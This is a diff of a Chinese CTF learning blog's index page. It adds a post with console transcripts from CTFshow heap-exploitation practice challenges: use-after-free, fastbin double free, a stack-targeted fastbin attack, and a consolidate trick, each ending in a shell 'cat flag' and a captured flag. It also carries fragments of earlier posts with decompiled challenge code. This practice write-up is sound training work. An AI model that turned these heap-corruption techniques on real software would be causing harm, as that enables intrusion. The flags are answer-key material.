@@ -22,15 +22,15 @@
     var CONFIG = {"hostname":"linkpwn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="linkpwn的学习经历">
+  <meta name="description" content="linkpwn的学习记录">
 <meta property="og:type" content="website">
 <meta property="og:title" content="网络幻影">
 <meta property="og:url" content="http://linkpwn.github.io/page/4/index.html">
 <meta property="og:site_name" content="网络幻影">
-<meta property="og:description" content="linkpwn的学习经历">
+<meta property="og:description" content="linkpwn的学习记录">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="linkpwn">
-<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta property="article:tag" content="ctf学习, 编程学习, 游戏, 日常">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="http://linkpwn.github.io/page/4/">
@@ -100,7 +100,7 @@
       <h1 class="site-title">网络幻影</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <p class="site-subtitle" itemprop="description">linkpwn</p>
       <a>
         <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
       </a>
@@ -232,12 +232,112 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/27/ctfshow-pwn145-158/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/07/27/ctfshow-pwn145-158/" class="post-title-link" itemprop="url">ctfshow pwn145-158</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-07-27 09:48:39" itemprop="dateCreated datePublished" datetime="2025-07-27T09:48:39+08:00">2025-07-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-09-23 20:40:25" itemprop="dateModified" datetime="2025-09-23T20:40:25+08:00">2025-09-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="pwn-145"><a href="#pwn-145" class="headerlink" title="pwn 145"></a>pwn 145</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Why it can UAF(use after free) ?                        </span><br><span class="line">    * *************************************                           </span><br><span class="line">演示glibc 的分配机制</span><br><span class="line">glibc 使用首次适应算法选择空闲的堆块</span><br><span class="line">如果有一个空闲堆块且足够大，那么 malloc 将选择它</span><br><span class="line">如果存在 use-after-free 的情况那可以利用这一特性</span><br><span class="line">首先申请两个比较大的 chunk</span><br><span class="line">第一个 a = malloc(0x512) 在: 0x18f5260</span><br><span class="line">第二个 b = malloc(0x256) 在: 0x18f5780</span><br><span class="line">我们可以继续分配它</span><br><span class="line">现在我们把 &quot;AAAAAAAA&quot; 这个字符串写到 a 那里 </span><br><span class="line">第一次申请的 0x18f5260 指向 AAAAAAAA</span><br><span class="line">接下来 free 掉第一个...</span><br><span class="line">接下来只要我们申请一块小于 0x512 的 chunk，那就会分配到原本 a 那里: 0x18f5260</span><br><span class="line">第三次 c = malloc(0x500) 在: 0x18f5260</span><br><span class="line">我们这次往里写一串 &quot;CCCCCCCC&quot; 到刚申请的 c 中</span><br><span class="line">第三次申请的 c 0x18f5260 指向 CCCCCCCC</span><br><span class="line">第一次申请的 a 0x18f5260 指向 CCCCCCCC</span><br><span class="line">可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 &quot;CCCCCCCC&quot;</span><br><span class="line">sh</span><br><span class="line">cat ctfshow_flag</span><br><span class="line">ctfshow&#123;3f139a53-9718-4b95-936c-a73c2296849b&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="pwn146"><a href="#pwn146" class="headerlink" title="pwn146"></a>pwn146</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Why it can UAF(use after free) ?                        </span><br><span class="line">    * *************************************                           </span><br><span class="line">申请0x20大小的内存p1 的地址: 0x13ba010</span><br><span class="line">把p1[1]赋值为Printf函数，然后打印出&quot;Hello CTFshow&quot;</span><br><span class="line">Hello CTFshow</span><br><span class="line"></span><br><span class="line">free 掉 p1</span><br><span class="line">因为并没有置为null，所以p1[1]仍然是Printf函数，仍然可以输出打印了&quot;Hello CTFshow again&quot;</span><br><span class="line">Hello CTFshow again</span><br><span class="line">接下来再去malloc一个p2，会把释放掉的p1给分配出来，可以看到他俩是同一地址的</span><br><span class="line">p2 的地址: 0x13ba010</span><br><span class="line">p1 的地址: 0x13ba010</span><br><span class="line">然后把p2[1]给改成demoflag也就是system函数</span><br><span class="line"></span><br><span class="line">Then get the flag &amp;&amp; enjoy it !</span><br><span class="line"></span><br><span class="line">$sh</span><br><span class="line">cat flag</span><br><span class="line">ctfshow&#123;5247ed61-a52c-4a9d-8dcd-53b8467a17ec&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="pwn147"><a href="#pwn147" class="headerlink" title="pwn147"></a>pwn147</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Fastbin_dup -- Double free                              </span><br><span class="line">    * *************************************                           </span><br><span class="line">演示 fastbin 的 double free</span><br><span class="line">首先申请 3 个 chunk</span><br><span class="line">第一个 malloc(8): 0x1b39010</span><br><span class="line">第二个 malloc(8): 0x1b39030</span><br><span class="line">第三个 malloc(8): 0x1b39050</span><br><span class="line">free 掉第一个</span><br><span class="line">当我们再次 free 0x1b39010 的时候, 程序将会崩溃因为 0x1b39010 在 free 链表的第一个位置上</span><br><span class="line">我们先 free 0x1b39030.</span><br><span class="line">现在我们就可以再次 free 0x1b39010 了, 因为他现在不在 free 链表的第一个位置上</span><br><span class="line">现在空闲链表是这样的 [ 0x1b39010, 0x1b39030, 0x1b39010 ]. 如果我们 malloc 三次, 我们会得到两次 0x1b39010 </span><br><span class="line">第一次 malloc(8): 0x1b39010</span><br><span class="line">第二次 malloc(8): 0x1b39030</span><br><span class="line">第三次 malloc(8): 0x1b39010</span><br><span class="line">$sh </span><br><span class="line">cat flag</span><br><span class="line">ctfshow&#123;7dbdfb56-d36a-42a8-a804-0e990d4d61dc&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="pwn148"><a href="#pwn148" class="headerlink" title="pwn148"></a>pwn148</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Fastbin_dup_into_stack -- Double free                   </span><br><span class="line">    * *************************************                           </span><br><span class="line">通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）</span><br><span class="line">通过 malloc 申请到 0x7ffe9bec2270.</span><br><span class="line">先申请3 个 chunk</span><br><span class="line">chunk a: 0x25dd010</span><br><span class="line">chunk b: 0x25dd030</span><br><span class="line">chunk c: 0x25dd050</span><br><span class="line">free 掉 chunk a</span><br><span class="line">如果还对 0x25dd010 进行 free, 程序会崩溃。因为 0x25dd010 现在是 fastbin 的第一个</span><br><span class="line">先对 b 0x25dd030 进行 free</span><br><span class="line">接下来就可以对 0x25dd010 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了</span><br><span class="line">现在 fastbin 的链表是 [ 0x25dd010, 0x25dd030, 0x25dd010 ] 接下来通过修改 0x25dd010 上的内容来进行攻击.</span><br><span class="line">第一次 malloc(8): 0x25dd010</span><br><span class="line">第二次 malloc(8): 0x25dd030</span><br><span class="line">现在 fastbin 表中只剩 [ 0x25dd010 ] 了</span><br><span class="line">接下来往 0x25dd010 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去</span><br><span class="line">现在覆盖 0x25dd010 前面的 8 字节，修改 fd 指针指向 stack_var 前面 0x20 的位置</span><br><span class="line">第三次 malloc(8): 0x25dd010, 把栈地址放到 fastbin 链表中</span><br><span class="line">这一次 malloc(8) 就申请到了栈上去: 0x7ffe9bec2270</span><br><span class="line">$sh</span><br><span class="line">cat flag</span><br><span class="line">ctfshow&#123;f7fdefd4-fab4-4a29-96b0-8ccb6f648dc1&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="pwn149"><a href="#pwn149" class="headerlink" title="pwn149"></a>pwn149</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">linkpwn@linkpwn-VMware-Virtual-Platform:~$ nc pwn.challenge.ctf.show 28266</span><br><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Fastbin_dup_consolidate                                 </span><br><span class="line">    * *************************************                           </span><br><span class="line">申请两个 fastbin 范围内的 chunk: p1=0x197a010 p2=0x197a030</span><br><span class="line">先 free p1</span><br><span class="line">去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=0x197a050</span><br><span class="line">因为 malloc_consolidate(), p1 会被放到 unsorted bin 中</span><br><span class="line">这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free</span><br><span class="line">现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: 0x197a010 0x197a010</span><br><span class="line">$sh </span><br><span class="line">cat flag</span><br><span class="line">ctfshow&#123;2f30058c-812f-4649-9b5d-6298c5144bba&#125;</span><br></pre></td></tr></table></figure>
+
+<p>写着写着发现一直写这个营养价值太低了，先停下把，以后发现了营养再来写。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/18/unsorted-bin-attack/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -297,7 +397,7 @@
           <h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><h3 id="原理学习"><a href="#原理学习" class="headerlink" title="原理学习:"></a>原理学习:</h3><p>首先我们来了解一下unsorted bin的结构</p>
 <p>unsorted bin是双链表，和fastbin不同，但是都在mian_arena里，所以unsorted bin 头节点的地址就是mian_arena+偏移。</p>
 <p>那我们怎么利用这个进行攻击呢。攻击过程和unstore的结构如下：</p>
-<p><img src="/2025/07/18/unsorted-bin-attack/1.png" alt="1"></p>
+<p><img src="/./unsorted-bin-attack/1.png" alt="1"></p>
 <p>最后一步指针为什么是这样变化的可以去看看unlink执行过程的指针变化。</p>
 <p>从图中我们可以看出我们可以把地址改成一个值但是值是个很大的值，而且我们自己不能控制。</p>
 <h3 id="pwn144"><a href="#pwn144" class="headerlink" title="pwn144"></a>pwn144</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">114514</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1BF52</span> ) <span class="comment">//修改magic大于0x1BF52即可达到后门函数</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          TaT();   <span class="comment">//后门函数</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -341,7 +441,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -488,7 +588,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -542,13 +642,13 @@
 
       
           <p>开始网鼎杯的jocker学习</p>
-<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/1.png" alt="1"></p>
+<p><img src="/./%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/1.png" alt="1"></p>
 <p>修复sp</p>
-<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/2.png" alt="2"></p>
-<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/3.png" alt="3"></p>
-<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/4.png" alt="4"></p>
+<p><img src="/./%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/2.png" alt="2"></p>
+<p><img src="/./%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/3.png" alt="3"></p>
+<p><img src="/./%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/4.png" alt="4"></p>
 <p>可是encrypt函数还是进不去</p>
-<p><img src="/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/5.png" alt="5"></p>
+<p><img src="/./%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/5.png" alt="5"></p>
 <p>这是个smc动调解密函数，进入函数后从text:00401500的定义头道endp进行u(undefine)再在定义头p重定义函数。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">encrypt</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1[<span class="number">19</span>]; <span class="comment">// [esp+1Ch] [ebp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+68h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  qmemcpy(v1, &amp;unk_403040, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">18</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span>)(a1[i] ^ Buffer[i]) != v1[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;wrong ~&quot;</span>);</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    